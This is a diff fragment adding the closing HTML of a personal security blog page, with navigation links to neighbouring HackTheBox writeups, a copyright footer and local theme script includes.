+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/htb/unified/" class="prev" rel="prev" title="HackTheBox - Unified Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Unified Writeup</a>
+            <a href="/posts/htb/return/" class="next" rel="next" title="HackTheBox - Return Writeup">HackTheBox - Return Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
